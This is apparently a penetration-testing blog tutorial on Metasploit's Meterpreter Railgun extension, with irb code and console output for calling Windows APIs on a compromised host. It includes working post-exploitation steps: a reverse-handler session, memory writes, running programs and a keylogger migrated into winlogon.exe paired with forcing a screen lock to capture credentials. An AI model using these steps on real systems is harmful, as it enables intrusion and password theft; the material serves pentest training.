---
layout: post
title:  "MSF Meterpreter and Railgun"
date:   2018-09-26 20:49:33 +0000
tags: [metasploit, pentest, redteam, blueteam]
---
![](/blog/assets/msf.png)

## What is Railgun?
Railgun is a very powerful post exploitation feature exclusive to Windows Meterpreter.
It allows you to have complete control of your target machine's Windows API, or you can use whatever DLL you find and do even more creative stuff with it.

**It can even be used to bypass Anti-Virus by calling functions directly from DLLs**

## How to use Railgun for Windows post exploitation
For the purpose of this post, we will assume you have successfully launched a meterpreter torjan on a test vm, or exploited a vulnerable vm
and have a meterpreter session on a Windows(XP/7/10(<1703)) target.

**Note:** We state Windows 10 before version 1703, as 1703 introduced a number of security improvements that detect Railgun:
Window Management Framework (“PowerShell”) 5.1 provides:
* PS Script Block Logging
* PS Transaction/Transcription Logging
* PS “Suspicious Strings”
* PS Constrained Language Mode
* Just Enough Admin (JEA) support 
  
If you're a penetration tester, obviously post exploitation is an important skill to have, but if you don't know Railgun, 
you are missing out.

### Defining a DLL and its functions
The Windows API is quite large with a number of documented and undocumented calls, so by default Railgun only comes with a handful of pre-defined DLLs 
and functions that are commonly used for building a Windows program. 

These built-in DLLs are: <code>kernel32, ntdll, user32, ws2_32, iphlpapi, advapi32, shell32, netapi32, crypt32, wlanapi, wldap32, version. </code>The same list of built-in DLLs can also be retrieved by using the known_dll_names method.

All DLL definitions are found in the "def" directory, where they are defined as classes. 

The following template should demonstrate how a DLL is actually defined:
```
module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Railgun
module Def

class Def_somedll

  def self.create_dll(dll_path = 'somedll')
    dll = DLL.new(dll_path, ApiConstants.manager)

    # 1st argument = Name of the function
    # 2nd argument = Return value's data type
    # 3rd argument = An array of parameters
    dll.add_function('SomeFunction', 'DWORD',[
      ["DWORD","hwnd","in"]
    ])

    return dll
  end

end

end; end; end; end; end; end; end
```
In function definitions, Railgun supports these datatypes: <code>VOID, BOOL, DWORD, WORD, BYTE, LPVOID, HANDLE, PDWORD, PWCHAR, PCHAR, PBLOB</code>.

There are four parameter/buffer directions: in, out, inout, and return. When you pass a value to an "in" parameter, 
Railgun handles the memory management. 
For example, MessageBoxA has a "in" parameter named lpText, and is of type PCHAR. 
You can simply pass a Ruby string to it, and Railgun handles the rest, it's all pretty straight forward.

An "out" parameter will always be of a pointer datatype. Basically you tell Railgun how many bytes to allocate for the parameter, it allocates memory, provides a pointer to it when calling the function, and then it reads that region of memory that the function wrote, converts that to a Ruby object and adds it to the return hash.

An "inout" parameter serves as an input to the called function, but can be potentially modified by it. You can inspect the return hash for the modified value like an "out" parameter.

A quick way to define a new function at runtime can be done like the following example:
```
client.railgun.add_dll('user32','user32.dll')

client.railgun.add_function( 'user32', 'MessageBoxA', 'DWORD',[
        ["DWORD","hWnd","in"],
        ["PCHAR","lpText","in"],
        ["PCHAR","lpCaption","in"],
        ["DWORD","uType","in"],
        ])

>> client.railgun.user32.MessageBoxA(0,"Hello","world","MB_OK")
((((((and after you click OK on the target system)))))
=> {"GetLastError"=>0, "return"=>1}
```
However, if this function will most likely be used more than once, or it's part of the Windows API, then you should put it in the library.

## Usage
The best way to try Railgun is with irb in a Windows Meterpreter prompt. Here's an example of how to get there:
```
$ msfconsole -q
msf > use exploit/multi/handler 
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.64:4444 
[*] Starting the payload handler...
[*] Sending stage (769536 bytes) to 192.168.1.106
[*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.106:55148) at 2014-07-30 19:49:35 -0500

meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

>>
```
Note that when you're running a post module or in irb, you always have a client or session object to work with, both point to same thing, which in this case is Msf::Sessions::Meterpreter_x86_Win. This Meterpreter session object gives you API access to the target machine, including the Railgun object Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::Railgun. Here's how you simply access it:
<pre>
session.railgun
</pre>
If you run the above in irb, you will see that it returns information about all the DLLs, functions, constants, etc, except it's a little unfriendly to read because there's so much data. Fortunately, there are some handy tricks to help us to figure things out. For example, like we mentioned before, if you're not sure what DLLs are loaded, you can call the known_dll_names method:
```
>> session.railgun.known_dll_names
=> ["kernel32", "ntdll", "user32", "ws2_32", "iphlpapi", "advapi32", "shell32", "netapi32", "crypt32", "wlanapi", "wldap32", "version"]
```
Now, say we're interested in user32 and we want to find all the available functions (as well as return value's data type, parameters), another handy trick is this:
<pre>
session.railgun.user32.functions.each_pair {|n, v| puts "Function name: #{n}, Returns: #{v.return_type}, Params: #{v.params}"}
</pre>
Note that if you happen to call an invalid or unsupported Windows function, a RuntimeError will raise, and the error message also shows a list of available functions.

To call a Windows API function, here's how:
```
>> session.railgun.user32.MessageBoxA(0, "hello, world", "hello", "MB_OK")
=> {"GetLastError"=>0, "ErrorMessage"=>"The operation completed successfully.", "return"=>1}
```
As you can see this API call returns a hash. One habit we have seen is that sometimes people don't like to check GetLastError, ErrorMessage, and/or the return value, they kind of just assume it works.

This is a bad programming habit, and is not recommended. If you always assume something works, and execute the next API call, you risk having unexpected results (worst case scenario: losing the Meterpreter session).

### Memory Reading and Writing
The Railgun class also has two very useful methods that you will probably use: memread and memwrite. The names are pretty self-explanatory: You read a block of memory, or you write to a region of memory. We'll demonstrate this with a new block of memory in the payload itself:
```
>> p = session.sys.process.open(session.sys.process.getpid, PROCESS_ALL_ACCESS)
=> #<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 @client=#<Session:meterpreter 192.168.1.106:55151 (192.168.1.106) "WIN-6NH0Q8CJQVM\sinn3r @ WIN-6NH0Q8CJQVM">, @handle=448, @channel=nil, @pid=2268, @aliases={"image"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Image:0x007fe2c5a25828 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, "io"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::IO:0x007fe2c5a257b0 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, "memory"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Memory:0x007fe2c5a25738 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, "thread"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Thread:0x007fe2c5a256c0 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>}>
>> p.memory.allocate(1024)
=> 5898240
```
As you can see, the new allocation is at address 5898240 (or 0x005A0000 in hex). Let's first write four bytes to it:
```
>> session.railgun.memwrite(5898240, "AAAA", 4)
=> true
```
memwrite returns true, which means successful. Now let's read 4 bytes from 0x005A0000:
```
>> session.railgun.memread(5898240, 4)
=> "AAAA"
```
Be aware that if you supply a bad pointer, you can cause an access violation and crash Meterpreter.

### Admin or notAdmin?
<pre>
>> client.railgun.shell32.IsUserAnAdmin
</pre>
### System Info
```
>> client.sys.config.sysinfo 
>> client.sys.config.sysinfo ['OS'] 
>> client.sys.config.sysinfo ['Domain'] 
>> client.sys.config.getuid 
```
### Get Network Interfaces
```
>> interface = client.net.config.interfaces 
>> interface.each do | i | 
>> puts i.pretty 
>> end 
```
### Enumerate Accessible Functions
```
>> puts client.railgun.user32 
RuntimeError: DLL-function to_ary not found. Known functions: ["ActivateKeyboardLayout", 
"AdjustWindowRect", 
"AdjustWindowRectEx", 
"AllowSetForegroundWindow",
```
### To list all loaded DLL
```
>> client.railgun.known_dll_names
=> ["kernel32", "ntdll", "user32", "ws2_32", "iphlpapi", "advapi32", "shell32", "netapi32", "crypt32", "wlanapi", "wldap32", "version", "psapi"]
```
To list all available function and its parameters for specific DLL (say user32 )
<pre>
client.railgun.user32.functions.each_pair {|n, v| puts "Function name: #{n}, Params: #{v.params}"}
</pre>
### Execute File
<pre>
>> client.railgun.kernel32.WinExec ("calc", 0) 
</pre>
### Prevent Sleep Mode
<pre>
client.railgun.kernel32.SetThreadExecutionState("ES_CONTINUOUS |ES_SYSTEM_REQUIRED")
</pre>
### List Drives
The problem that I’ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.
* net use - Shows you what Network drives are connected, but not physical ones
* fsutil fsinfo drives - You must be an administrator to ride this train
* fdisk /status - Only on OLD versions of DOS, not sure when this disappeared

But railgun solves this problem with a really short script:
```
# Load the Railgun plugin  **_Update: You no longer need this step_**  
# client.core.use("railgun")   
# Make the API call to enum drive letters   
a = client.railgun.kernel32.GetLogicalDrives()["return"]         
# Math magic to convert the binary to letters        
drives = []         
letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"         
(0..25).each do |i|        
	test = letters[i,1]        
	rem = a % (2**(i+1))        
	if rem > 0        
		drives << test        
		a = a - rem        
	end        
end         
print_line("Drives Available = #{drives.inspect}")
Output: Drives Available = ["A", "C", "D", "P", "X"]
```
### Jedi Keylogging
One of the problems with keylogging is you never know when that person will log in, and if you’re using a client side, they have probably already logged in and you’re hoping they log into a portal or some other password protected site.

Railgun to the rescue again:
```
# Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon**   
meterpreter > bgrun keylogrecorder -c 1 -t 15        
[*] Executed Meterpreter with Job ID 0        
meterpreter > 
[*] winlogon.exe Process found, migrating into 640        
[*] Migration Successful!!        
[*] Starting the keystroke sniffer...        
[*] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt        
[*] Recording         
  
# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.**

meterpreter > irb       
[*] Starting IRB shell        
[*] The 'client' variable holds the meterpreter client

client.core.use("railgun")       
=> true        
client.railgun.user32.LockWorkStation()        
=> {"GetLastError"=>0, "return"=>true}        
exit        
meterpreter >
```
Set up “tail -f” going on the log file for the keylogger and then kill the keylogger when you’ve gotten what you came for.
```
meterpreter > bglist       
[*] Job 0: ["keylogrecorder", "-c", "1", "-t", "15"]        
meterpreter > bgkill 0        
[*] Killing background job 0...        
meterpreter >
```
## Conclusion
Railgun is an important peice of software for budding penetration testers and red-teamers. Hopefully, this post has served as an adequate 
introduction into the power and possibililties of generating post exploitation scripts.

Moving forward we suggest reading the sourcecode of Metasploit's post exploitation scripts; where MSF and the community have already compiled a collection 
of scripts for your post exploitation needs.

## References
* https://www.offensive-security.com/metasploit-unleashed/api-calls/
* http://www.hahwul.com/2015/08/metasploit-metasploit-autorunscript.html
* http://www.hahwul.com/2016/02/metasploit-localexploitsuggester-local.html
* https://msdn.microsoft.com/en-us/library/windows/desktop/ms687393(v=vs.85).aspx
* https://msdn.microsoft.com/en-us/library/windows/desktop/ms645505(v=vs.85).aspx
